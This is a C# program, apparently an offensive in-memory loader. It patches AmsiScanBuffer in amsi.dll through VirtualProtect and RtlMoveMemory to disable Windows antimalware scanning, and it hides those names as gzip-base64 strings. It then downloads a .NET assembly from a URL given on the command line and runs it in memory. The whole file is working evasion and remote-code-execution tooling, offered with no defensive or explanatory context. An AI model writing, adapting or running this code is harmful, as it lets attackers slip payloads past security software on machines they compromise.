using System;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace LoaderDynamic
{
    public class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr LoadLibraryA(string name);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool VirtualProtect(IntPtr addr, uint size, uint protect, out uint oldProtect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void MoveMemory(IntPtr to, IntPtr from, uint size);

        private static int Patch()
        {
            // "amsi.dll"
            var targetDll = Dynamic.GetFunction<LoadLibraryA>("LoadLibraryA")
                (Decoder.Decode("H4sIAAAAAAAEAEvMLc7US8nJAQATiukICAAAAA=="));
            if (targetDll == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve DLL pointer");
                return 1;
            }

            // "AmsiScanBuffer"
            var abufptr = Dynamic.GetFunctionPointer(targetDll, Decoder.Decode("H4sIAAAAAAAEAHPMLc4MTk7McypNS0stAgAJba5LDgAAAA=="));
            if (abufptr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve function pointer");
                return 1;
            }

            var dwSize = 4u;
            if (!Dynamic.GetFunction<VirtualProtect>("VirtualProtect")
                (abufptr, dwSize, 0x40, out _))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions");
                return 1;
            }

            byte[] patch = { 0x31, 0xff, 0x90 };

            var unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);
            Dynamic.GetFunction<MoveMemory>("RtlMoveMemory")
                (abufptr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("Sucessfully patched");
            return 0;
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("No assembly loaded.");
            }
            else if (!Uri.IsWellFormedUriString(args[0], UriKind.Absolute))
            {
                Console.WriteLine($"Not a valid URI: '{args[0]}'");
            }
            else
            {
                Patch();
                Console.WriteLine($"Loading assembly from: '{args[0]}'");
                var response = new WebClient().DownloadData(args[0]);
                var asm = Assembly.Load(response);
                var entry = asm.EntryPoint;
                var newArgs = args.ToList();
                newArgs.RemoveAt(0);
                entry.Invoke(null, new object[] { newArgs.ToArray() });
                Console.WriteLine("All done.");
            }
        }
    }
}
